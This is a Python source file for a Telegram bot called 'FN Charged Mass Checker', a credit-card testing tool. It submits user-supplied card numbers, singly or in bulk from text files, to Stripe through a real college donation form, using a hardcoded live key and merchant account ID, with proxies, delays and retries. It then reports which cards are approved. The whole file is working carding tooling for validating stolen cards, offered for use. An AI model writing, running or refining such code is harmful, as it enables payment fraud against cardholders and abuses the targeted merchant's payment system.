import requests
import json
import time
import sys
import random
from colorama import Fore, init
from telegram import Update, InputFile
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
import asyncio
import io
import logging

# Initialize colorama
init(autoreset=True)

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Global variables for tracking progress
user_progress = {}
active_users = set()
TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"  # ⚠️ REPLACE WITH YOUR BOT TOKEN ⚠️

def create_session(proxy=None):
    """Create a new session with headers and cookies"""
    session = requests.Session()
    
    if proxy:
        session.proxies = {
            "http": proxy,
            "https": proxy
        }
    
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Linux; Android 13; 22011119TI Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.6943.121 Mobile Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Language": "en-IN,en-US;q=0.9,en;q=0.8",
        "sec-ch-ua": '"Not(A:Brand";v="99", "Android WebView";v="133", "Chromium";v="133""',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"'
    })
    return session

def get_payment_intent(session, amount="10"):
    """Fetch payment intent from the server with enhanced error handling"""
    donation_url = "https://www.mc.edu/give"
    payment_url = "https://go.mc.edu/register/form?cmd=payment"
    
    try:
        # Initial request with timeout and SSL verification
        session.get(donation_url, timeout=15, verify=True)
        
        headers = {
            "Host": "go.mc.edu",
            "X-Requested-With": "XMLHttpRequest",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://go.mc.edu",
            "Referer": "https://go.mc.edu/register/?id=789d4530-51d3-d805-2676-2ca00dbbc45c&amp%3Bamp=&amp%3Bsys%3Afield%3Aonline_giving_department=3cef5b4a-e694-4df1-8ec4-1c94954a5131",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty"
        }

        data = {
            "cmd": "getIntent",
            "amount": amount,
            "payment_type": "card",
            "summary": "Donations",
            "currency": "usd",
            "account": "acct_1KQdE6PmVGzx57IR",
            "setupFutureUsage": "",
            "test": "0",
            "add_fee": "0"
        }

        response = session.post(payment_url, headers=headers, data=data, timeout=15)
        response.raise_for_status()
        
        if response.status_code != 200:
            logger.error(f"Payment gateway returned HTTP {response.status_code}")
            return None, None
            
        response_data = response.json()
        logger.debug(f"Payment intent response: {response_data}")  # Debug logging
        
        if not all(key in response_data for key in ('id', 'clientSecret')):
            logger.error("Invalid payment intent response structure")
            return None, None
            
        return response_data['id'], response_data['clientSecret']
        
    except requests.exceptions.RequestException as e:
        logger.error(f"Connection error: {str(e)}")
        return None, None
    except json.JSONDecodeError:
        logger.error("Failed to decode JSON response")
        return None, None
    except Exception as e:
        logger.error(f"Unexpected error: {str(e)}")
        return None, None

def luhn_check(card_number):
    """Validate card number using Luhn algorithm"""
    card_number = card_number.replace(" ", "")
    if not card_number.isdigit():
        return False
    digits = list(map(int, card_number))
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    total = sum(odd_digits)
    for d in even_digits:
        total += sum(divmod(2 * d, 10))
    return total % 10 == 0

def process_card(session, payment_intent_id, client_secret, card_info):
    """Submit card details to Stripe API with API key verification"""
    # First verify Stripe API key
    test_url = "https://api.stripe.com/v1/charges"
    test_headers = {
        "Host": "api.stripe.com",
        "Origin": "https://js.stripe.com",
        "Referer": "https://js.stripe.com/",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "application/json"
    }
    
    try:
        test_response = session.get(test_url, headers=test_headers, timeout=5)
        if test_response.status_code == 401:
            return False, "Invalid Stripe API key"
    except Exception as e:
        return False, f"Stripe API check failed: {str(e)}"

    # Process the card if API key is valid
    card_number, exp_month, exp_year, cvc = card_info
    card_number = card_number.replace(" ", "")

    if not luhn_check(card_number):
        return False, "Invalid card number (Luhn check failed)"

    url = f"https://api.stripe.com/v1/payment_intents/{payment_intent_id}/confirm"
    headers = {
        "Host": "api.stripe.com",
        "Origin": "https://js.stripe.com",
        "Referer": "https://js.stripe.com/",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "application/json"
    }

    data = {
        "payment_method_data[type]": "card",
        "payment_method_data[card][number]": card_number,
        "payment_method_data[card][cvc]": cvc,
        "payment_method_data[card][exp_year]": exp_year,
        "payment_method_data[card][exp_month]": exp_month,
        "payment_method_data[allow_redisplay]": "unspecified",
        "payment_method_data[billing_details][address][postal_code]": "10006",
        "payment_method_data[billing_details][address][country]": "US",
        "payment_method_data[payment_user_agent]": "stripe.js/a8247d96cc; stripe-js-v3/a8247d96cc; payment-element; deferred-intent",
        "payment_method_data[referrer]": "https://go.mc.edu",
        "payment_method_data[time_on_page]": str(int(time.time() * 1000)),
        "payment_method_data[client_attribution_metadata][client_session_id]": "d67fc2ce-78dc-4f28-8ce1-2a546a6606dd",
        "payment_method_data[client_attribution_metadata][merchant_integration_source]": "elements",
        "payment_method_data[client_attribution_metadata][merchant_integration_subtype]": "payment-element",
        "payment_method_data[client_attribution_metadata][merchant_integration_version]": "2021",
        "payment_method_data[client_attribution_metadata][payment_intent_creation_flow]": "deferred",
        "payment_method_data[client_attribution_metadata][payment_method_selection_flow]": "merchant_specified",
        "payment_method_data[guid]": "NA",
        "payment_method_data[muid]": "NA",
        "payment_method_data[sid]": "NA",
        "expected_payment_method_type": "card",
        "client_context[currency]": "usd",
        "client_context[mode]": "payment",
        "client_context[capture_method]": "manual",
        "client_context[payment_method_types][0]": "card",
        "client_context[payment_method_options][us_bank_account][verification_method]": "instant",
        "use_stripe_sdk": "true",
        "key": "pk_live_f1etgxOxEyOS3K9myaBrBqrA",
        "_stripe_account": "acct_1KQdE6PmVGzx57IR",
        "client_secret": client_secret,
    }

    try:
        response = session.post(url, headers=headers, data=data, timeout=20)
        response.raise_for_status()
        response_data = response.json()

        if response_data.get('status') == 'requires_capture':
            return True, "Card approved ✅"
        return False, f"Declined: {response_data.get('error', {}).get('message', 'Unknown error')}"
    
    except requests.exceptions.RequestException as e:
        return False, f"Request failed: {str(e)}"
    except json.JSONDecodeError:
        return False, "Invalid JSON response"

def parse_card_line(line):
    """Parse card info from text line"""
    line = line.strip()
    if not line or line.startswith('#'):
        return None

    delimiters = ['|', ',', ';', '/']
    for delim in delimiters:
        if delim in line:
            parts = line.split(delim)
            if len(parts) == 4:
                card_number = parts[0].strip()
                exp_month = parts[1].strip()
                exp_year = parts[2].strip().replace("20", "")
                cvc = parts[3].strip()
                return card_number, exp_month, exp_year, cvc
    return None

async def handle_single_cc(update: Update, context: ContextTypes.DEFAULT_TYPE, card_info: str):
    """Handle single CC check with retry logic"""
    user_id = update.effective_user.id
    if user_id in active_users:
        await update.message.reply_text("Please wait until your current check completes.")
        return

    active_users.add(user_id)
    try:
        card_data = parse_card_line(card_info)
        if not card_data:
            await update.message.reply_text("Invalid CC format. Use: /chk 4222222222222|05|25|372")
            return

        max_retries = 3
        payment_intent_id = None
        client_secret = None
        
        for attempt in range(max_retries):
            session = create_session()
            payment_intent_id, client_secret = get_payment_intent(session)
            
            if payment_intent_id and client_secret:
                break
                
            if attempt == max_retries - 1:
                await update.message.reply_text("Payment gateway unavailable after 3 attempts")
                return
                
            await asyncio.sleep(2 ** attempt)  # Exponential backoff

        success, msg = process_card(session, payment_intent_id, client_secret, card_data)
        card_number = card_data[0]
        masked = card_number[:6] + "******" + card_number[-4:]
        
        if success:
            await update.message.reply_text(f"✅ Approved: {masked}")
        else:
            await update.message.reply_text(f"❌ Declined: {masked}\nReason: {msg}")
            
    except Exception as e:
        await update.message.reply_text(f"Error processing card: {str(e)}")
    finally:
        active_users.remove(user_id)

async def check_file(update: Update, context: ContextTypes.DEFAULT_TYPE, file_content: bytes):
    """Process file with progress tracking"""
    user_id = update.effective_user.id
    if user_id in active_users:
        await update.message.reply_text("Please wait until your current check completes.")
        return

    active_users.add(user_id)
    user_progress[user_id] = {"current": 0, "total": 0}
    
    try:
        file_text = file_content.decode()
        cards = [line.strip() for line in file_text.split('\n') if line.strip() and not line.startswith('#')]
        user_progress[user_id]["total"] = len(cards)
        
        charged_cards = []
        for idx, line in enumerate(cards, 1):
            user_progress[user_id]["current"] = idx
            if idx % 5 == 0:
                await send_progress(update, context, idx, len(cards))
            
            card_info = parse_card_line(line)
            if not card_info:
                continue

            session = create_session()
            payment_intent_id, client_secret = get_payment_intent(session)
            if not all([payment_intent_id, client_secret]):
                continue

            success, _ = process_card(session, payment_intent_id, client_secret, card_info)
            if success:
                charged_cards.append(line)
            
            await asyncio.sleep(random.uniform(1.5, 3.0))

        if charged_cards:
            result = "Charged cards:\n" + "\n".join(charged_cards)
            await update.message.reply_document(
                document=InputFile(io.BytesIO(result.encode()), filename="results.txt"),
                caption=f"Found {len(charged_cards)} charged cards"
            )
        else:
            await update.message.reply_text("No charged cards found in the file")
            
    except Exception as e:
        await update.message.reply_text(f"Error processing file: {str(e)}")
    finally:
        active_users.remove(user_id)
        del user_progress[user_id]

async def send_progress(update: Update, context: ContextTypes.DEFAULT_TYPE, current: int, total: int):
    """Send progress update to user"""
    progress = f"Progress: {current}/{total} ({current/total*100:.1f}%)"
    try:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=progress,
            reply_to_message_id=update.message.message_id
        )
    except Exception as e:
        logger.error(f"Error sending progress: {e}")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command handler"""
    welcome_text = """
    🚀 Welcome to FN Charged Mass Checker!
    
    Send me a TXT file with CC details or use:
    /chk 4222222222222|05|25|372
    """
    await update.message.reply_text(welcome_text)

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle incoming messages"""
    if update.message.document:
        file = await update.message.document.get_file()
        file_content = await file.download_as_bytearray()
        await check_file(update, context, file_content)
    else:
        await update.message.reply_text("Please send a TXT file or use /chk command")

async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /chk command"""
    if not context.args:
        await update.message.reply_text("Please provide CC details after /chk")
        return
    
    card_info = ' '.join(context.args)
    await handle_single_cc(update, context, card_info)

async def progress_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /progress command"""
    user_id = update.effective_user.id
    if user_id not in user_progress:
        await update.message.reply_text("No active checks running")
        return
    
    progress = user_progress[user_id]
    await update.message.reply_text(
        f"Progress: {progress['current']}/{progress['total']} "
        f"({progress['current']/progress['total']*100:.1f}%)"
    )

def main():
    """Main application setup"""
    application = Application.builder().token(TOKEN).build()

    # Add handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("chk", chk_command))
    application.add_handler(CommandHandler("progress", progress_command))
    application.add_handler(MessageHandler(filters.Document.TXT | filters.TEXT & ~filters.COMMAND, handle_message))

    print(Fore.CYAN + "Bot is running...")
    application.run_polling()

if __name__ == "__main__":
    main()